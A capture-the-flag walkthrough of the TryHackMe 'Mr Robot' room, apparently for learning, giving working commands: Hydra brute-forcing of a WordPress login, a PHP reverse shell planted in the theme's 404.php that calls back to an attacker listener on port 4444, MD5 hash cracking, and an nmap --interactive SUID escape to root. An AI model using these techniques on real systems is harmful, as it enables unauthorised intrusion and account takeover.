# Mr Robot - TryHackMe

> **Kill Chain Summary**:
> Network Reconnaissance (Ports 80, 443) -> Robots.txt Inspection (`fsocity.dic` Wordlist & Key 1 Discovery) -> WordPress User Enumeration (`Elliot`) -> Hydra WordPress Brute-Force (`Elliot:ER28-0652`) -> WordPress Theme Editor RCE via `404.php` -> Reverse Shell as `daemon` -> Password Hash Extraction in `/home/robot/` -> Offline MD5 Cracking via CrackStation -> Lateral Movement to `robot` (Key 2) -> SUID Enumeration (`/usr/local/bin/nmap`) -> Interactive Nmap Shell Escape -> Root Shell (Key 3).

| Property | Value |
| :--- | :--- |
| **Target Name** | Mr Robot |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Web Enumeration, Hydra WordPress Brute-Force, Theme Editor 404 Shell, Offline MD5 Cracking, Legacy Nmap SUID Escape |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.150.20 10.10.150.20
```

**Open Ports:**
- **Port 80:** HTTP (Apache httpd)
- **Port 443:** HTTPS (Apache httpd SSL)

### 1.2 Web Enumeration and Discovery

Navigating to `http://10.10.150.20/` reveals an interactive terminal-style landing page inspired by the Mr. Robot series.

Checking `robots.txt`:

```bash
curl -s http://10.10.150.20/robots.txt
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Retrieving both files:
1. `key-1-of-3.txt`: Contains the first challenge key.
2. `fsocity.dic`: A large wordlist containing usernames and potential passwords based on show lore.

Retrieve the first flag:

```bash
curl -s http://10.10.150.20/key-1-of-3.txt
```

```text
[FLAG REDACTED]
```

Fuzzing directories with Gobuster confirms an active WordPress installation:

```bash
gobuster dir -u http://10.10.150.20/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/wp-login.php        (Status: 200)
/readme.html         (Status: 200)
/license.txt         (Status: 200)
```

---

## 2. Initial Access

### 2.1 WordPress User Enumeration & Dictionary Cleaning

The WordPress login page responds with distinct error messages depending on user existence:
- Non-existent user: `Invalid username`
- Valid user with incorrect password: `The password you entered for the username <USER> is incorrect`

Deduplicating the `fsocity.dic` wordlist to remove redundancies:

```bash
sort -u fsocity.dic > fsocity_clean.dic
```

Using Hydra to test usernames against `/wp-login.php` identifies a valid account: **`Elliot`**.

### 2.2 Password Brute-Force via Hydra

Brute-force the password for `Elliot` using the cleaned dictionary:

```bash
hydra -l Elliot -P fsocity_clean.dic 10.10.150.20 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered" -t 30
```

```text
[80][http-post-form] host: 10.10.150.20   login: Elliot   password: ER28-0652
1 of 1 target completed, 1 valid password found
```

Valid credentials:
- **Username:** `Elliot`
- **Password:** `ER28-0652`

### 2.3 WordPress Theme Editor Remote Code Execution

1. Authenticate to the administration dashboard at `http://10.10.150.20/wp-login.php`.
2. Navigate to **Appearance -> Editor**.
3. Select the active theme and edit the **404 Template** (`404.php`).
4. Replace the template contents with a PHP reverse shell (e.g., PentestMonkey PHP reverse shell configured with the attacker IP and port 4444).
5. Start a Netcat listener:

```bash
nc -lvnp 4444
```

6. Trigger the payload by requesting a non-existent URL:

```bash
curl http://10.10.150.20/nonexistent_page.php
```

The listener catches the reverse shell executing under the web service identity:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.150.20] 51234
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

---

## 3. Privilege Escalation

### 3.1 Lateral Movement: `daemon` to `robot`

Enumerating `/home/robot/`:

```bash
ls -la /home/robot
```

```text
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

The second flag (`key-2-of-3.txt`) is restricted to user `robot`, but `password.raw-md5` is world-readable:

```bash
cat /home/robot/password.raw-md5
```

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracking the raw MD5 hash using Hashcat or online databases (CrackStation):
- **Hash:** `c3fcd3d76192e4007dfb496cca67e13b`
- **Plaintext:** `abcdefghijklmnopqrstuvwxyz`

Spawn an interactive PTY and switch to user `robot`:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su robot
```

Provide password `abcdefghijklmnopqrstuvwxyz` when prompted:

```bash
robot@linux:~$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

Retrieve the second flag:

```bash
cat /home/robot/key-2-of-3.txt
```

```text
[FLAG REDACTED]
```

### 3.2 Privilege Escalation: Legacy Nmap SUID Escape

Search for SUID binaries across the filesystem:

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/local/bin/nmap
/bin/ping
/bin/mount
...
```

The binary `/usr/local/bin/nmap` has the SUID bit enabled and is owned by `root`.

> [!NOTE] Concept: GTFOBins Nmap Interactive Shell Escape
> Legacy versions of Nmap (versions 2.02 to 5.21) support an interactive mode via the `--interactive` flag. Because the binary runs with the SUID bit, executing the internal shell command `!sh` from the interactive prompt spawns an elevated shell without dropping effective root privileges.

Execute Nmap in interactive mode:

```bash
/usr/local/bin/nmap --interactive
```

From within the interactive Nmap prompt:

```text
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=1002(robot)
```

The shell is running with effective root privileges (`euid=0`).

Retrieve the third and final flag:

```bash
cat /root/key-3-of-3.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Deduplicate Wordlists
sort -u raw_wordlist.txt > clean_wordlist.txt

# Hydra WordPress Form Brute-Force
hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered"

# Enumerate SUID Binaries
find / -perm -u=s -type f 2>/dev/null

# Legacy Nmap SUID Privilege Escalation
/usr/local/bin/nmap --interactive
nmap> !sh
```

---

## 5. Key Takeaways and Lessons Learned

1. **Wordlist Deduplication:** Wordlists extracted from web applications or CTF challenges often contain thousands of duplicate lines. Running `sort -u` dramatically optimizes brute-force speed.
2. **WordPress Error Differentiation:** Default WordPress installations reveal valid usernames via distinct error strings. This behavior allows attackers to confirm valid user accounts before launching targeted password dictionary attacks.
3. **Legacy SUID Features:** Standard diagnostic tools like older Nmap builds often feature legacy interactive debug shells. Always consult GTFOBins when unfamiliar or unexpected SUID binaries appear in filesystem enumeration.

---

#tryhackme #linux #medium #wordpress #hydra #bruteforce #hashcat #crackstation #suid #nmap #gtfobins #privesc
